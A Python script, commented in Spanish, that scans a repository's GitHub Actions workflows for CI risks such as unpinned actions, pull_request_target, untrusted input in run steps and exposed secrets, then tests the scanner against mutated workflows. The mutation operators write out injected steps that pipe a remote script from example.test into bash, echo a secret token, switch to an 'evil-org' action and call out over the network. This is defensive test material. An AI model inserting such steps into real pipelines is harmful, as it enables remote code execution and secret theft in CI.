"""SE-406: riesgos de CI. Escáner de reglas sobre los workflows reales del repositorio y frente a mutaciones (semilla fija)."""
import sys
sys.stdout.reconfigure(encoding="utf-8")
import re, os, random, sys, glob, hashlib
REPO = os.environ.get("REPO", os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
def scan(text):
    f = []
    for ln, l in enumerate(text.splitlines(), 1):
        m = re.search(r"uses:\s*([^\s#]+)", l)
        if m and not m.group(1).startswith(("./", "docker://")):
            ref = m.group(1).split("@")[-1]
            if "@" not in m.group(1) or not re.fullmatch(r"[0-9a-f]{40}", ref): f.append(("R1 acción sin fijar a SHA", ln))
    if not re.search(r"^permissions:", text, re.M): f.append(("R2 sin permissions de nivel superior", 0))
    if re.search(r"permissions:\s*write-all", text): f.append(("R2b permissions write-all", 0))
    if "pull_request_target" in text: f.append(("R3 pull_request_target", 0))
    for ln, l in enumerate(text.splitlines(), 1):
        if re.search(r"\$\{\{\s*github\.(event\.(pull_request\.(title|body|head\.ref)|issue\.title|comment\.body)|head_ref)", l) and "run" in "".join(text.splitlines()[max(0, ln - 6):ln]):
            f.append(("R4 contexto no confiable interpolado en run", ln))
        if re.search(r"curl[^|\n]*\|\s*(ba)?sh", l): f.append(("R5 curl | sh", ln))
        if re.search(r"run:.*\$\{\{\s*secrets\.", l) or re.search(r"echo.*\$\{\{\s*secrets\.", l): f.append(("R6 secreto interpolado en un comando", ln))
    if re.search(r"actions/checkout@", text) and not re.search(r"persist-credentials:\s*false", text): f.append(("R7 checkout con credenciales persistidas", 0))
    return f
print("python", sys.version.split()[0], sys.platform)
print("== escaneo real de .github/workflows de este repositorio")
bases = {}
for p in sorted(glob.glob(os.path.join(REPO, ".github", "workflows", "*.yml"))):
    t = open(p, encoding="utf-8", newline="").read().replace("\r\n", "\n"); bases[os.path.basename(p)] = t
    uses = re.findall(r"uses:\s*([^\s#]+)", t)
    print(f"{os.path.basename(p):14s} líneas {len(t.splitlines()):3d}  acciones usadas {len(uses):2d}  fijadas a SHA {sum(1 for u in uses if re.fullmatch(r'[0-9a-f]{40}', u.split('@')[-1]))}  hallazgos {len(scan(t))}  sha256 {hashlib.sha256(t.encode()).hexdigest()[:12]}")
OPS = ["desfijar una acción (SHA → v4)", "quitar permissions de nivel superior", "permissions: write-all", "añadir pull_request_target", "interpolar el título del PR en run", "añadir curl | bash",
       "quitar persist-credentials: false", "interpolar un secreto en run", "fijar a SHA un repositorio de otro dueño", "fijar a un SHA válido pero malicioso (cambia 1 hex)", "añadir un paso run con ruta de salida de red"]
def mutate(t, op, rng):
    lines = t.split("\n"); idx = [i for i, l in enumerate(lines) if "uses:" in l and re.search(r"@[0-9a-f]{40}", l)]
    if op == OPS[0]: i = rng.choice(idx); lines[i] = re.sub(r"@[0-9a-f]{40}.*", "@v4", lines[i])
    elif op == OPS[1]: lines = [l for l in lines if not l.startswith("permissions")] if False else re.sub(r"^permissions:\n(?:  .*\n)+", "", "\n".join(lines), flags=re.M).split("\n")
    elif op == OPS[2]: lines = re.sub(r"^permissions:\n(?:  .*\n)+", "permissions: write-all\n", "\n".join(lines), flags=re.M).split("\n")
    elif op == OPS[3]: lines = "\n".join(lines).replace("on:\n", "on:\n  pull_request_target:\n", 1).split("\n")
    elif op == OPS[4]: i = rng.choice(idx); lines.insert(i + 1, '      - run: echo "${{ github.event.pull_request.title }}"')
    elif op == OPS[5]: i = rng.choice(idx); lines.insert(i + 1, "      - run: curl -sSL https://example.test/i.sh | bash")
    elif op == OPS[6]: lines = [l for l in lines if "persist-credentials" not in l]
    elif op == OPS[7]: i = rng.choice(idx); lines.insert(i + 1, '      - run: echo ${{ secrets.TOKEN }}')
    elif op == OPS[8]: i = rng.choice(idx); lines[i] = re.sub(r"uses:\s*actions/", "uses: evil-org/", lines[i])
    elif op == OPS[9]: i = rng.choice(idx); lines[i] = re.sub(r"@([0-9a-f]{40})", lambda m: "@" + m.group(1)[:-1] + ("0" if m.group(1)[-1] != "0" else "1"), lines[i])
    elif op == OPS[10]: i = rng.choice(idx); lines.insert(i + 1, "      - run: python -c \"import urllib.request as u; u.urlopen('https://example.test/x')\"")
    return "\n".join(lines)
print("== escáner frente a 11 operadores x 3 workflows x 5 ubicaciones (mutaciones efectivas; las que no cambian el texto se descartan)")
tot = hit = 0
for op in OPS:
    k = n = 0
    for name, t in bases.items():
        for j in range(5):
            m = mutate(t, op, random.Random(OPS.index(op) * 100 + j))
            if m == t: continue
            n += 1; k += 1 if len(scan(m)) > len(scan(t)) else 0
    tot += n; hit += k; print(f"{op:52s} {k:2d} de {n}")
print(f"total {hit} de {tot} ({hit/tot*100:.1f} %)")
print("== radio de impacto de un paso comprometido (modelo de alcance)")
rows = [("GITHUB_TOKEN con permisos por defecto de escritura, secretos como variables del job", "repositorio (código, etiquetas, releases), secretos del job, caché"),
        ("permissions: contents: read, sin secretos en el job", "lectura del código; el artefacto puede alterarse dentro del job"),
        ("permissions: {} en el nivel superior y permisos por job", "solo lo que el job necesita (p. ej. id-token: write únicamente en el job de publicación)"),
        ("workflow que corre código de forks con pull_request_target", "contexto privilegiado con código no confiable: acceso a secretos del repositorio base")]
for a, b in rows: print(f"- {a}\n    alcance: {b}")
